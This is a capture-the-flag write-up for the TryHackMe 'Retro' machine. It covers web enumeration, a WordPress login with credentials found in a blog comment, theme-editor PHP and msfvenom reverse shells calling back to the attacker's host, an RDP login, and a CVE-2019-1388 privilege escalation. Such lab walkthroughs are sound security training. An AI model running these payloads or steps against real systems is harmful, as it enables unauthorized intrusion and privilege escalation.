# Retro [TryHackMe]

<sup>This write-up covers the steps to root Retro machine on TryHackMe platform.</sup>

First let's scan the target:

```bash
nmap -A 10.10.67.61 -oN general.scan
```

The ports we got from this scan are `80` and `3389`. I think the room's questions suggest that the attack vector is supposed to be web related. Let's check it out:

```
firefox 10.10.67.61
```

The facing web page is a default of IIS Windows Server, like it says in the scan. Let's put it through `feroxbuster`

```
feroxbuster -u http://10.10.67.61 -w /usr/share/wordlists/seclists/Dicovery/Web-Content/big.txt -o ferox.scan
```

We got a path `/retro` and it seems to be the answer to the first question in the room. While I was answering that question, it became apparent that `retro` is running on wordpress, because a lot of wordpress related standard paths have showed up in the scan, like `wp-admin`, `wp-content`, `wp-includes`, etc.

The hind in the room's second question states:

> Don't leave sensitive information out in the open, even if you think you have control over it.

So I assume there's something on the website. I read through all blog posts and couldn't find anything, until I realized it must be in the comments. Sure enough, in the comments of the blog post "__Ready Player One__" Wade (author of the blog) left himself a note, which looks suspiciously like a password.

I tried a `wade:parzival` login-password pair on `wp-login.php` path and I entered the dashboard!

I will try, as usual to use a Theme Editor on the left under Appearance section and load one of the php pages with a reverse shell. I'll use the shell from [here](https://github.com/pentestmonkey/php-reverse-shell). 

Trying to simulate basic stealth, I chose a 404 page. The pentest monkey shell didn't work, something about the `uname` not being recognized as internal or external command. I didn't dive deep into it, just used `meterpreter` instead:

```
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.14.99.123 LPORT=9233 -f raw
```

And started a listener:

```
msfconsole -qx "use exploit/multi/handler;set payload php/meterpreter/reverse_tcp; set LHOST 10.14.99.123; set LPORT 9233; run"
```

And received a shell when I triggered a `404.php`:

```
[*] Started reverse TCP handler on 10.14.99.123:9233
[*] Sending stage (40004 bytes) to 10.10.67.61
[*] Meterpreter session 1 opened (10.14.99.123:9233 -> 10.10.67.61:50042) at 2025-04-08 15:14:01 -0400

(Meterpreter 1)(C:\inetpub\wwwroot\retro) >
```

This is all well and good as we can look around, but `php/windows` meterpreter isn't any good, because it has no useful post-ex modules and we have no permissions or privilege. Let's try port `3389` to try to log into the Windows server, via RDP with `wade:parzival`.

```
xfreerdp /v:10.10.67.61 /u:wade /p:parzival /cert:ignore +clipboard
```

This works and the first flag is on the user's desktop under `user.txt`. Now we will need some privesc to find `root.txt`. I am going to use `msfvenom`, the room suggests the same.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.14.99.123 LPORT=6565 -f exe -o shell.exe
```

Then upload this shell to user's desktop, run the `msfconsole`'s listener and run the executable.

```
[*] Started reverse TCP handler on 10.14.99.123:6565
[*] Sending stage (203846 bytes) to 10.10.67.61
[*] Meterpreter session 1 opened (10.14.99.123:6565 -> 10.10.67.61:50109) at 2025-04-08 15:51:31 -0400

(Meterpreter 1)(C:\Users\Wade\Desktop) >
```

While this shell is much more stable, the privesc modules don't do us any good here either. <sup>Assisted by [write-up](https://www.hackingarticles.in/retro-tryhackme-walkthrough/) I will follow the hint in the room and start from Google chrome. On the bookmarks bar there is a bookmark for `CVE-2019-1388`. To exploit this vulnerability we need an HTML help control file, which is in the Recycle Bin on Desktop.

We need to open this file "As Administrator", Click "Show more details", then "Show information about the publisher's certificate", then the link next to "Issued By", and choose Internet Explorer. 

After that go to settings -> File -> Save as... Navigate to `C:\Windows\System32`. Type `*.*` in the file name field to list all files. Find `cmd.exe`, right click it and open it. 
What happened is, Internet Explorer was accidentally run as administrator, because the app that linked to the website was running as administrator so when trying to access a filesystem from Internet Explorer, we could run anything as a system user. 

Now in cmd, navigate to `C:\Users\Administrator\Desktop`, you'll see a file `root.txt.txt` there:

```
type root.txt.txt
```

There's our flag!
